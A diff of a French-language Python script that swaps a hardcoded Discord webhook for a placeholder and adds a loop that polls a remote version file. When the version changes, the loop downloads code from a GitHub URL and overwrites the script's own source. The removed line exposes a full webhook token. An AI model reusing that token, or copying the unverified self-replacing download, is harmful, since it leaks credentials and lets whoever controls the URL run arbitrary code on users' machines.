@@ -14,16 +14,63 @@ headers = {
 
 from pathlib import Path
 
-# Chemin script
 chemin_script = Path(__file__).resolve()
+webhook = "https://discordapp.com/api/webhooks/..."
 
-# Discord
-webhook = "https://discordapp.com/api/webhooks/1445805470639067311/DdrHhMfsUhJbpH2bN8DBz_4-WblD3jlCgQtpLjS_4t5vjq6vuoURh0tGWhAIY2quGASi"  
-
-
-# URLS
-python = "https://linganguliguli.worldlite.fr/Formulaire/code.py"
+python_url = "https://raw.githubusercontent.com/juto222/Random-Team/main/code.py"
 url_version = "https://linganguliguli.worldlite.fr/Formulaire/v.txt"
+
+ancienne_version = "1.0.0"
+
+def script(python_url):
+    try:
+        r = requests.get(python_url, headers=headers, stream=True)
+        r.raise_for_status()
+        with open(chemin_script, "wb") as f:
+            for chunk in r.iter_content(chunk_size=8192):
+                if chunk:
+                    f.write(chunk)
+        print("Script téléchargé avec succès !")
+    except Exception as e:
+        print(f"Erreur lors du téléchargement du script : {e}")
+
+
+def maj_version(nouvelle_version):
+    try:
+        with open(chemin_script, "r", encoding="utf-8") as f:
+            contenu = f.read()
+
+        nouveau_contenu = re.sub(
+            r'ancienne_version\s*=\s*"[0-9.]+"',
+            f'ancienne_version = "{nouvelle_version}"',
+            contenu
+        )
+
+        with open(chemin_script, "w", encoding="utf-8") as f:
+            f.write(nouveau_contenu)
+        print(f"Version mise à jour dans le script : {nouvelle_version}")
+
+    except Exception as e:
+        print(f"Erreur lors de la mise à jour de la version : {e}")
+
+while True:
+    try:
+        r_version = requests.get(url_version, headers=headers)
+        r_version.raise_for_status()
+        nouvelle_version = r_version.text.strip()
+
+        if nouvelle_version != ancienne_version:
+            print(f"Nouvelle version détectée : {nouvelle_version}")
+            ancienne_version = nouvelle_version
+            script(python_url)
+            maj_version(nouvelle_version)
+        else:
+            print("Aucune nouvelle version.")
+
+    except Exception as e:
+        print(f"Erreur lors de la vérification de la version : {e}")
+
+    time.sleep(10)
 
 
 url = "https://linganguliguli.worldlite.fr/Formulaire/Formulaire.html"
